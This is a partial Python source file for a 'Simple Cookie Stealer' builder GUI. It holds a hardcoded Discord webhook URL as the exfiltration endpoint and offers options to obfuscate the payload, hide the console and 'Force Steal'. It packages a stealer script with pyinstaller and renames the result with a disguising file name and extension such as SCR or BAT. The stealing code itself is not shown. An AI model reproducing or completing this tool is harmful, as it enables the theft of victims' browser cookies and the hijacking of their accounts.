try:
  ...
  ctypes.windll.user32.MessageBoxW(
      0, "Please install the required libraries in requirements.txt", "Error",
      0)
  exit()

version = "1.0"

webhook = "https://discord.com/api/webhooks/1179104852903723040/uAt1gq9Ak9RMQplWFeUnqxelxY6rFHq6Mr6SlRV5NFb5_pSa1zMH0D-KxZVL3L1iR0Hg"  # Webhook URL
obfuscate = False  # Obfuscate the payload
hideConsole = False  # Hide the console when the payload is ran
forceRead = False
virtualenvir = False
inputFileName = "txt"  # Input file name
comboBoxFileType = "txt"  # File type


def build():
  if not os.path.exists("main.py"):
    ctypes.windll.user32.MessageBoxW(
        0, "main.py not found. Reinstall this program!", "Error", 0)
    return
  ...
  if virtualenvir:
    ...
    exec(
        open(f"{_filename}\\Scripts\\activate_this.py").read(),
        {'__file__': f"{_filename}\\Scripts\\activate_this.py"})
  ...
  os.system(
      f"{scriptsPath if virtualenvir else ''}pyinstaller --onefile {'--noconsole' if hideConsole else ''} --clean --icon=NONE "
      + filename)
  os.remove(filename)
  shutil.rmtree("build")
  shutil.copy2("dist\\" + filename.replace(".py", ".exe"),
               filename.replace(".py", ".exe"))
  shutil.rmtree("dist")
  os.remove(filename.replace(".py", ".spec"))
  if virtualenvir: shutil.rmtree(_filename)
  os.rename(filename.replace(".py", ".exe"),
            f"{inputFileName}.{comboBoxFileType.lower()}")
...
class GUI(customtkinter.CTk):
  ...
  def __init__(self):
    ...
    GeneralLabel = customtkinter.CTkLabel(master=self,
                                          text="Cookie Stealer",
                                          font=("Arial", 20))
    GeneralLabel.place(x=5, y=5)

    versionInfo = customtkinter.CTkLabel(
        master=self,
        text=f"Simple Cookie Stealer v{version}",
        font=("Arial", 10))
    versionInfo.place(x=5, y=375)

    self.configButton = customtkinter.CTkButton(master=self,
                                                text="Config",
                                                width=153,
                                                command=self.goToConfig,
                                                corner_radius=0,
                                                fg_color="#363636",
                                                hover_color="#363636")
    self.configButton.place(x=0, y=50)

    self.helpButton = customtkinter.CTkButton(master=self,
                                              text="Help",
                                              width=153,
                                              command=self.goToHelp,
                                              corner_radius=0,
                                              fg_color="#242424",
                                              hover_color="#363636")
    self.helpButton.place(x=0, y=80)

    self.creditsButton = customtkinter.CTkButton(master=self,
                                                 text="Credits",
                                                 width=153,
                                                 command=self.goToCredits,
                                                 corner_radius=0,
                                                 fg_color="#242424",
                                                 hover_color="#363636")
    self.creditsButton.place(x=0, y=110)

    self.configFrame = customtkinter.CTkFrame(master=self,
                                              width=547,
                                              height=400,
                                              corner_radius=0)
    self.configFrame.place(x=153, y=0)

    self.helpFrame = customtkinter.CTkFrame(master=self,
                                            width=547,
                                            height=400,
                                            corner_radius=0)

    self.creditFrame = customtkinter.CTkFrame(master=self,
                                              width=547,
                                              height=400,
                                              corner_radius=0)

    self.webhookBox = customtkinter.CTkEntry(master=self.configFrame,
                                             width=400,
                                             placeholder_text="Webhook URL")
    self.webhookBox.place(x=5, y=5)

    self.buildButton = customtkinter.CTkButton(master=self.configFrame,
                                               text="Build",
                                               width=132,
                                               command=self.handleBuildButton)
    self.buildButton.place(x=410, y=5)

    self.boxForceSteal = customtkinter.CTkCheckBox(
        master=self.configFrame,
        text="Force Steal",
        command=self.handleBoxForceRead)
    self.boxObfuscate = customtkinter.CTkCheckBox(
        master=self.configFrame,
        text="Obfuscate EXE",
        command=self.handleBoxObfuscate)
    self.boxHideConsole = customtkinter.CTkCheckBox(
        master=self.configFrame,
        text="Hide Console",
        command=self.handleBoxHideConsole)
    boxVirtualCompiler = customtkinter.CTkCheckBox(
        master=self.configFrame,
        text="Virtual Compiling Environment",
        command=self.handleBoxVirtualCompiler)
    self.inputFileName = customtkinter.CTkEntry(
        master=self.configFrame, width=200, placeholder_text="Input File Name")
    self.comboBoxFileType = customtkinter.CTkComboBox(
        master=self.configFrame,
        width=70,
        values=["EXE", "SCR", "COM", "BAT", "CMD"],
        command=self.handleComboBoxFileType)
    ...
    self.creditText = customtkinter.CTkTextbox(master=self.creditFrame,
                                               width=537,
                                               height=390,
                                               fg_color="#292929")
    self.creditText.insert(
        END, f"""Simple Cookie Stealer v{version}
...
""")
    ...
    self.helpText = customtkinter.CTkTextbox(master=self.helpFrame,
                                             width=537,
                                             height=390,
                                             fg_color="#292929")
    self.helpText.insert(
        END, """Welcome to Simple Cookie Stealer!
...
Yes, I know there isn't much here. It's a SIMPLE Cookie Stealer :)
  ...
  def handleBuildButton(self):
    ...
    if webhook == "":
      ctypes.windll.user32.MessageBoxW(0, "Please enter a webhook URL.",
                                       "Error", 0)
    ...
    threading.Thread(target=ctypes.windll.user32.MessageBoxW,
                     args=(0,
                           "Building! This takes a while, please be patient.",
                           "Building", 0)).start()
    build()
...
gui = GUI()
gui.mainloop()
<script src="https://gist.github.com/guillaumepiot/4539986.js"></script>